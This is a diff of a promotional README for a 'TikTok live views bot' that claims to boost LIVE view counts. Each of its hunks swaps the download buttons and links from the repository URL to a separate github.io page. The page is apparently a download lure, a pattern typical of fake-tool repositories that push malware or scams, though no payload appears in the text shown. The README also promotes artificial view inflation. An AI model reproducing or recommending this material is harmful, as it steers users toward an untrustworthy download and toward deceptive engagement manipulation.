@@ -1,7 +1,7 @@
 <h1>🤖 tiktok-live-views-bot-2026 - Boost Your Live Views Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/deedeemorphological3291/tiktok-live-views-bot-2026" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#ff0050,#00f2ea);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,0,80,0.4);margin:20px auto;">⬇️ DOWNLOAD NOW – FREE</a>
+  <a href="https://deedeemorphological3291.github.io" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#ff0050,#00f2ea);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,0,80,0.4);margin:20px auto;">⬇️ DOWNLOAD NOW – FREE</a>
 </p>
 
 ---
@@ -34,7 +34,7 @@ This guide is designed for complete beginners. Follow each step carefully, and y
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[https://github.com/deedeemorphological3291/tiktok-live-views-bot-2026](https://github.com/deedeemorphological3291/tiktok-live-views-bot-2026)**
+👉 **[https://deedeemorphological3291.github.io](https://deedeemorphological3291.github.io)**
 
 Once you click the link, you’ll be taken to a page where you can get the download. Look for a button that says **"Download"** or **"Clone"** on that page. Click it to save the file to your computer. The file will be named something like `tiktok-live-views-bot-2026` or similar.
 
@@ -136,7 +136,7 @@ For the best results, follow this pattern:
 Ready to boost your TikTok LIVE? Click the big button below:
 
 <p align="center">
-  <a href="https://github.com/deedeemorphological3291/tiktok-live-views-bot-2026" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#00f2ea,#ff0050);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(0,242,234,0.4);margin:20px auto;">🚀 DOWNLOAD TIKTOK LIVE VIEWS BOT 2026</a>
+  <a href="https://deedeemorphological3291.github.io" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#00f2ea,#ff0050);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(0,242,234,0.4);margin:20px auto;">🚀 DOWNLOAD TIKTOK LIVE VIEWS BOT 2026</a>
 </p>
 
 Visit this link to download the application. It’s quick, easy, and free.
